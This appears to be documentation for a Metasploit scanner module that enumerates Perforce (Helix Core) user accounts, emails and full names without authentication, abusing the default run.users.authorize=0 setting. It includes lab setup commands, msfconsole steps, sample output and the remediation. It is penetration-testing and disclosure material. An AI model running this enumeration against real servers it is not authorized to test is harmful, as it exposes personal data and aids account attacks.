## Description

Enumerates user accounts from Perforce (Helix Core) servers without
authentication. Exploits the default configuration (`run.users.authorize=0`),
which allows unauthenticated clients to list all user accounts, email
addresses, and full names via the `user-users` command.

Auto-detects SSL/TLS and unicode server modes — no manual flags required.

**Affected:** all Perforce server versions with default settings.

**Remediation:** `p4 configure set run.users.authorize=1`

## Vulnerable Application

### Install a test Perforce server (Linux)

```bash
# Download p4d (subject to Perforce terms of use: https://www.perforce.com/legal)
wget https://ftp.perforce.com/perforce/r24.2/bin.linux26x86_64/p4d
chmod +x p4d

# Start a plain ASCII server on port 1666
mkdir p4root_test
./p4d -r ./p4root_test -p 1666 -d

# Seed some users (requires the p4 client binary)
./p4 -p 1666 -u admin user -f -i <<EOF
User: jdoe
Email: jdoe@example.com
FullName: Jane Doe
EOF
```

The default `run.users.authorize=0` setting means no authentication is
needed to list users. No configuration changes are required to reproduce the
vulnerability.

## Verification Steps

1. `use auxiliary/scanner/perforce/perforce_user_enum`
2. `set RHOSTS <target>`
3. `set RPORT 1666`
4. `run`
5. User accounts are printed and stored in loot.

## Options

| Option  | Default | Description                          |
|---------|---------|--------------------------------------|
| RHOSTS  |         | Target host(s)                       |
| RPORT   | 1666    | Perforce server port                 |
| TIMEOUT | 10      | Connection and read timeout (seconds)|

## Scenarios

### ASCII server, plain TCP

```
msf6 > use auxiliary/scanner/perforce/perforce_user_enum
msf6 auxiliary(scanner/perforce/perforce_user_enum) > set RHOSTS 192.0.2.10
RHOSTS => 192.0.2.10
msf6 auxiliary(scanner/perforce/perforce_user_enum) > run

[+] 192.0.2.10:1666 [tcp] abob <abob@example.com> "Alice Bob"
[+] 192.0.2.10:1666 [tcp] jdoe <jdoe@example.com> "Jane Doe"
[+] 192.0.2.10:1666 [tcp] svc_build <svc@example.com> "Build Service"
[*] 192.0.2.10:1666 - 3 user(s) stored to loot
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### SSL server (auto-detected)

```
msf6 auxiliary(scanner/perforce/perforce_user_enum) > set RHOSTS 192.0.2.20
RHOSTS => 192.0.2.20
msf6 auxiliary(scanner/perforce/perforce_user_enum) > run

[+] 192.0.2.20:1666 [ssl] abob <abob@example.com> "Alice Bob"
[+] 192.0.2.20:1666 [ssl] jdoe <jdoe@example.com> "Jane Doe"
[*] 192.0.2.20:1666 - 2 user(s) stored to loot
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Server hardened (run.users.authorize=1)

```
msf6 auxiliary(scanner/perforce/perforce_user_enum) > run

[*] 192.0.2.10:1666 - No users returned (run.users.authorize may be set)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
